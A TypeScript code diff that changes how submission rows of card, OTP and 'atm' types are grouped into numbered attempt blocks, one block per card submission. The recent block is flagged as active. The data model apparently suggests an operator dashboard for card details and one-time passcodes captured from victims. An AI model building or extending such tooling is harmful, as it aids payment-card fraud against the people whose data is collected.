@@ -163,7 +163,7 @@ function formatTime(iso: string) {
   });
 }
 
-// Group rows into attempt blocks based on time gaps
+// Group rows into attempt blocks - one block per card submission
 function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
   if (rows.length === 0) return [];
 
@@ -173,46 +173,32 @@ function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
   );
 
   const blocks: AttemptBlock[] = [];
-  let currentBlock: AttemptBlock | null = null;
-  let attemptNumber = 1;
 
+  // Process rows - create NEW block for EVERY card
   for (const row of sorted) {
-    if (!currentBlock) {
-      currentBlock = {
-        attemptNumber: attemptNumber++,
+    if (row.type === "card") {
+      // Every card creates a NEW attempt block
+      const newBlock: AttemptBlock = {
+        attemptNumber: blocks.length + 1,
         startTime: row.createdAt,
+        card: row,
         isActive: false,
       };
+      blocks.push(newBlock);
+    } else if (row.type === "otp" && blocks.length > 0) {
+      // OTP goes to the LATEST block (the card that came before it)
+      // Only if this block doesn't already have an OTP
+      const latestBlock = blocks[blocks.length - 1];
+      if (!latestBlock.otp) {
+        latestBlock.otp = row;
+      }
+    } else if (row.type === "atm" && blocks.length > 0) {
+      // ATM goes to the LATEST block
+      const latestBlock = blocks[blocks.length - 1];
+      if (!latestBlock.atm) {
+        latestBlock.atm = row;
+      }
     }
-
-    // Check if we need to start a new block (time gap > 10 minutes AND it's a card)
-    const timeDiff = new Date(row.createdAt).getTime() - new Date(currentBlock.startTime).getTime();
-    
-    if (timeDiff > ATTEMPT_GAP_MS && row.type === "card") {
-      blocks.push(currentBlock);
-      currentBlock = {
-        attemptNumber: attemptNumber++,
-        startTime: row.createdAt,
-        isActive: false,
-      };
-    }
-
-    // Add row to current block
-    switch (row.type) {
-      case "card":
-        currentBlock.card = row;
-        break;
-      case "otp":
-        currentBlock.otp = row;
-        break;
-      case "atm":
-        currentBlock.atm = row;
-        break;
-    }
-  }
-
-  if (currentBlock) {
-    blocks.push(currentBlock);
   }
 
   // Mark the most recent block as active (if within 5 minutes)
